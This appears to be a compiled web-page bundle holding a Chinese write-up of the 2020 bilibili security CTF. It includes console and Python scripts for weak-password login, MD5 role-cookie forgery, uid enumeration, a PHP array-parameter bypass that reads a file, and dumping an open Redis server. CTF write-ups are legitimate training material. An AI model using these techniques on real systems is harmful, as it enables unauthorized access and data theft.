import{_ as o,c as i,b as e,a as s,e as a,d as p,o as l,r as c}from"./app-CxAoBuKS.js";const u="/assets/image-20201025033756049-AHeYv7z-.png",r="/assets/image-20201025033919390-DjyyQPft.png",d="/assets/image-20201025034750293-1gj1NgQI.png",k="/assets/image-20201025034545434-DowwRMCI.png",v={},b={href:"https://security.bilibili.com/sec1024/",target:"_blank",rel:"noopener noreferrer"},m={href:"https://github.com/interesting-1024/end/blob/main/end.php",target:"_blank",rel:"noopener noreferrer"};function g(h,n){const t=c("ExternalLinkIcon");return l(),i("div",null,[n[11]||(n[11]=e('<h1 id="ctf" tabindex="-1"><a class="header-anchor" href="#ctf"><span>CTF</span></a></h1><blockquote><p>CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式。</p><p>CTF起源于1996年DEFCON全球黑客大会，以代替之前黑客们通过互相发起真实攻击进行技术比拼的方式。</p><p>——百度百科</p></blockquote><h1 id="目录" tabindex="-1"><a class="header-anchor" href="#目录"><span>目录</span></a></h1><h1 id="首届bilibili安全挑战赛" tabindex="-1"><a class="header-anchor" href="#首届bilibili安全挑战赛"><span>首届bilibili安全挑战赛</span></a></h1><img src="'+u+'" alt="image-20201025033756049" style="zoom:50%;"><img src="'+r+'" alt="image-20201025033919390"><p>2020-bilibili-sec1024</p>',7)),s("ul",null,[n[2]||(n[2]=s("li",null,"时间：20201024",-1)),n[3]||(n[3]=s("li",null,"解题md：https://github.com/AyalaKaguya/2020-bilibili-sec1024/blob/f42bf0ef78a1755beebd243864be39e5fffba13f/readme.md",-1)),n[4]||(n[4]=s("li",null,"本记录由 TePuint Club 赞助完成",-1)),n[5]||(n[5]=s("li",null,"注意：如果你没有达到70分请不要往下查看",-1)),s("li",null,[n[1]||(n[1]=a("活动地址：")),s("a",b,[n[0]||(n[0]=a("sec1024")),p(t)])])]),n[12]||(n[12]=e('<p><img src="'+d+`" alt="image-20201025034750293" loading="lazy"></p><h2 id="第一题-页面的背后是什么" tabindex="-1"><a class="header-anchor" href="#第一题-页面的背后是什么"><span>第一题 - 页面的背后是什么？</span></a></h2><p>打开DevTool审查元素，在<code>&lt;input&gt;</code>中找到data</p><h2 id="第二题-真正的秘密只有特殊的设备才能看到" tabindex="-1"><a class="header-anchor" href="#第二题-真正的秘密只有特殊的设备才能看到"><span>第二题 - 真正的秘密只有特殊的设备才能看到</span></a></h2><p>修改浏览器的User-Agent为 <code>bilibili Security Browser</code>，然后刷新网页，就可以看到flag了。</p><h2 id="第三题-密码是啥" tabindex="-1"><a class="header-anchor" href="#第三题-密码是啥"><span>第三题 - 密码是啥？</span></a></h2><p>就是弱口令，完全靠猜，用户名 <code>admin</code> ，密码 <code>bilibili</code> 。</p><p>或者直接在Console中输入：</p><div class="language-javascript line-numbers-mode" data-ext="js" data-title="js"><pre class="language-javascript"><code>$<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    <span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">&quot;api/ctf/3&quot;</span><span class="token punctuation">,</span>
    <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">&quot;post&quot;</span><span class="token punctuation">,</span>
    <span class="token literal-property property">contentType</span><span class="token operator">:</span> <span class="token string">&quot;application/json&quot;</span><span class="token punctuation">,</span>
    <span class="token literal-property property">dataType</span><span class="token operator">:</span> <span class="token string">&quot;json&quot;</span><span class="token punctuation">,</span>
    <span class="token literal-property property">data</span><span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
        <span class="token literal-property property">username</span><span class="token operator">:</span> <span class="token string">&quot;admin&quot;</span><span class="token punctuation">,</span>
        <span class="token literal-property property">passwd</span><span class="token operator">:</span> <span class="token string">&quot;bilibili&quot;</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>data<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="第四题-对不起-权限不足" tabindex="-1"><a class="header-anchor" href="#第四题-对不起-权限不足"><span>第四题 - 对不起，权限不足～</span></a></h2><p>cookies中 <code>role</code> 对应的值为user的MD5，所以将这个值改为 <code>Administration</code> 的MD5，即 <code>7b7bc2512ee1fedcd76bdc68926d4f7b</code> ，然后刷新网页，就可以看到flag了。</p><p><img src="`+k+`" alt="image-20201025034545434" loading="lazy"></p><h2 id="第五题-别人的秘密" tabindex="-1"><a class="header-anchor" href="#第五题-别人的秘密"><span>第五题 - 别人的秘密</span></a></h2><p>使用Console向后穷举，我也不知道那个uid哪里来的。</p><p>在Console中输入：</p><div class="language-javascript line-numbers-mode" data-ext="js" data-title="js"><pre class="language-javascript"><code><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">100336889</span><span class="token punctuation">)</span> <span class="token comment">//这里每个人有可能不一样，请在网页中查找</span>
<span class="token keyword">function</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token parameter">uid</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
        <span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">&quot;api/ctf/5?uid=&quot;</span> <span class="token operator">+</span> uid<span class="token punctuation">,</span>
        <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">&quot;get&quot;</span><span class="token punctuation">,</span>
        <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>data<span class="token punctuation">)</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token function">get</span><span class="token punctuation">(</span>uid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>或者用Python</p><div class="language-python line-numbers-mode" data-ext="py" data-title="py"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> json

headers <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">&#39;User-Agent&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0&#39;</span><span class="token punctuation">,</span>
    <span class="token string">&#39;Cookie&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;session=&#39;</span> <span class="token operator">+</span> <span class="token string">&#39;eyJ1aWQiOiIxMTg1NzUwNyJ9.X5Qtww.V8vz03C0YCnk7sLz_VVAo8AxuTw&#39;</span>
    <span class="token operator">+</span> <span class="token string">&#39;; role=ee11cbb19052e40b07aac0ca060c23ee&#39;</span><span class="token punctuation">,</span>
    <span class="token string">&#39;Referer&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;http://45.113.201.36/user.html&#39;</span>
<span class="token punctuation">}</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100336850</span><span class="token punctuation">,</span> <span class="token number">100336980</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&#39;http://45.113.201.36/api/ctf/5?uid=&#39;</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#100336973</span>
    <span class="token keyword">if</span> response<span class="token punctuation">[</span><span class="token string">&#39;data&#39;</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;第5题答案是:&#39;</span><span class="token punctuation">,</span> response<span class="token punctuation">[</span><span class="token string">&#39;data&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;uid是:&#39;</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="第十题-结束亦是开始" tabindex="-1"><a class="header-anchor" href="#第十题-结束亦是开始"><span>第十题 - 结束亦是开始</span></a></h2><p>你没看错，这里是第十题，但这一题的入口在第六题，也就是第六题做完是第十题的答案。</p><p>![image-20201025034516030](L:\\MdNote\\01. 设计开发\\Develop\\Dev_Hack\\CTF经验.assets\\image-20201025034516030.png)</p><blockquote><p>注意：每个人的靶机不一定相同，请注意更换IP</p></blockquote><ol><li>访问 <code>http://120.92.151.189/blog/test.php</code> （扫目录扫出来的）</li><li>将网页中所有的内容（JSFuck）复制粘贴到Console中，获取str1和str2</li></ol><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code> <span class="token keyword">var</span> str1 <span class="token operator">=</span> <span class="token string">&quot;\\u7a0b\\u5e8f\\u5458\\u6700\\u591a\\u7684\\u5730\\u65b9&quot;</span><span class="token punctuation">;</span>
 <span class="token keyword">var</span> str2 <span class="token operator">=</span> <span class="token string">&quot;bilibili1024havefun&quot;</span><span class="token punctuation">;</span>
 console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,24)),s("ol",null,[n[8]||(n[8]=s("li",null,[a("将str1进行Unicode转中文得到 "),s("code",null,"程序员最多的地方"),a(" 即 GitHub")],-1)),n[9]||(n[9]=s("li",null,'在GitHub搜索str2,即"bilibili1024havefun"',-1)),s("li",null,[n[7]||(n[7]=a("在搜索结果中找到与end有关的那个 ")),s("a",m,[n[6]||(n[6]=a("传送门")),p(t)])]),n[10]||(n[10]=s("li",null,"分析PHP文件,id为不含1的数组，路径不清楚要猜",-1))]),n[13]||(n[13]=e(`<div class="language-php line-numbers-mode" data-ext="php" data-title="php"><pre class="language-php"><code> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

    <span class="token comment">//filename end.php</span>

    <span class="token variable">$bilibili</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;bilibili1024havefun&quot;</span><span class="token punctuation">;</span>

    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;id&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$reg</span> <span class="token operator">=</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;/\\d/is&#39;</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;id&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;id&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$reg</span> <span class="token operator">!==</span> <span class="token number">1</span> <span class="token keyword">and</span> <span class="token variable">$str</span> <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;url&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">//文件路径猜解</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;还差一点点啦～&quot;</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;你想要的不在这儿～&quot;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token delimiter important">?&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol><li>构造URL，使满足 <code>!is_numeric($_GET[&#39;id&#39;]) and $reg !== 1 and $str === 1</code></li><li>猜URL，访问 <code>http://120.92.151.189/blog/end.php?id[]=&amp;url=./flag.txt</code> 得到一张图片</li><li>图片另存为，并用npp或者记事本打开,就可以在文件末尾找到flag</li></ol><h2 id="第八题" tabindex="-1"><a class="header-anchor" href="#第八题"><span>第八题</span></a></h2><p>linux方法：只有flag8才是对的</p><p>![image-20201025035041005](L:\\MdNote\\01. 设计开发\\Develop\\Dev_Hack\\CTF经验.assets\\image-20201025035041005.png)</p><p>在做本题时可能会遇到redis连接不上的问题，我们使用Python脚本进行轰炸</p><p>首先安装redis库：<code>!pip3 install redis</code></p><p>接着执行以下Python脚本：</p><div class="language-python line-numbers-mode" data-ext="py" data-title="py"><pre class="language-python"><code><span class="token keyword">import</span> redis

serve <span class="token operator">=</span> <span class="token string">&#39;45.113.201.36&#39;</span> <span class="token comment">#设置服务器IP地址</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;Connecting the Server (&#39;</span><span class="token operator">+</span>serve<span class="token operator">+</span><span class="token string">&#39;) ...&#39;</span><span class="token punctuation">)</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        r <span class="token operator">=</span> redis<span class="token punctuation">.</span>StrictRedis<span class="token punctuation">(</span>host<span class="token operator">=</span>serve<span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">6379</span><span class="token punctuation">)</span>
        keys <span class="token operator">=</span> r<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;We got the flag:&#39;</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> key <span class="token keyword">in</span> keys<span class="token punctuation">:</span>
            value <span class="token operator">=</span> r<span class="token punctuation">.</span>get<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span>
        <span class="token keyword">break</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;Error: Connection timed out&#39;</span><span class="token punctuation">)</span>
        <span class="token keyword">pass</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,9))])}const f=o(v,[["render",g],["__file","CTF经验.html.vue"]]),C=JSON.parse('{"path":"/MdNote_Public/01.%20DesignAndDevelop/Develop/04.%20Project/Type/Hack/CTF%EF%BC%88Capture%20The%20Flag%EF%BC%89/CTF%E7%BB%8F%E9%AA%8C.html","title":"CTF","lang":"zh-CN","frontmatter":{"description":"CTF CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式。 CTF起源于1996年DEFCON全球黑客大会，以代替之前黑客们通过互相发起真实攻击进行技术比拼的方式。 ——百度百科 目录 首届bilibili安全挑战赛 image-20201025033756049 ima...","head":[["meta",{"property":"og:url","content":"http://192.168.0.101:8080/MdNote_Public/01.%20DesignAndDevelop/Develop/04.%20Project/Type/Hack/CTF%EF%BC%88Capture%20The%20Flag%EF%BC%89/CTF%E7%BB%8F%E9%AA%8C.html"}],["meta",{"property":"og:site_name","content":"Linc 的小站"}],["meta",{"property":"og:title","content":"CTF"}],["meta",{"property":"og:description","content":"CTF CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式。 CTF起源于1996年DEFCON全球黑客大会，以代替之前黑客们通过互相发起真实攻击进行技术比拼的方式。 ——百度百科 目录 首届bilibili安全挑战赛 image-20201025033756049 ima..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"article:author","content":"LincZero"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"CTF\\",\\"image\\":[\\"\\"],\\"dateModified\\":null,\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"LincZero\\",\\"url\\":\\"https://github.com/LincZero/\\"}]}"]]},"headers":[{"level":1,"title":"CTF","slug":"ctf","link":"#ctf","children":[]},{"level":1,"title":"目录","slug":"目录","link":"#目录","children":[]},{"level":1,"title":"首届bilibili安全挑战赛","slug":"首届bilibili安全挑战赛","link":"#首届bilibili安全挑战赛","children":[{"level":2,"title":"第一题 - 页面的背后是什么？","slug":"第一题-页面的背后是什么","link":"#第一题-页面的背后是什么","children":[]},{"level":2,"title":"第二题 - 真正的秘密只有特殊的设备才能看到","slug":"第二题-真正的秘密只有特殊的设备才能看到","link":"#第二题-真正的秘密只有特殊的设备才能看到","children":[]},{"level":2,"title":"第三题 - 密码是啥？","slug":"第三题-密码是啥","link":"#第三题-密码是啥","children":[]},{"level":2,"title":"第四题 - 对不起，权限不足～","slug":"第四题-对不起-权限不足","link":"#第四题-对不起-权限不足","children":[]},{"level":2,"title":"第五题 - 别人的秘密","slug":"第五题-别人的秘密","link":"#第五题-别人的秘密","children":[]},{"level":2,"title":"第十题 - 结束亦是开始","slug":"第十题-结束亦是开始","link":"#第十题-结束亦是开始","children":[]},{"level":2,"title":"第八题","slug":"第八题","link":"#第八题","children":[]}]}],"git":{"createdTime":null,"updatedTime":null,"contributors":[]},"readingTime":{"minutes":3.16,"words":947},"filePathRelative":"MdNote_Public/01. DesignAndDevelop/Develop/04. Project/Type/Hack/CTF（Capture The Flag）/CTF经验.md","excerpt":"\\n<blockquote>\\n<p>CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式。</p>\\n<p>CTF起源于1996年DEFCON全球黑客大会，以代替之前黑客们通过互相发起真实攻击进行技术比拼的方式。</p>\\n<p>——百度百科</p>\\n</blockquote>\\n<h1>目录</h1>\\n<h1>首届bilibili安全挑战赛</h1>\\n\\n\\n<p>2020-bilibili-sec1024</p>\\n<ul>\\n<li>时间：20201024</li>\\n<li>解题md：https://github.com/AyalaKaguya/2020-bilibili-sec1024/blob/f42bf0ef78a1755beebd243864be39e5fffba13f/readme.md</li>\\n<li>本记录由 TePuint Club 赞助完成</li>\\n<li>注意：如果你没有达到70分请不要往下查看</li>\\n<li>活动地址：<a href=\\"https://security.bilibili.com/sec1024/\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">sec1024</a></li>\\n</ul>","autoDesc":true}');export{f as comp,C as data};
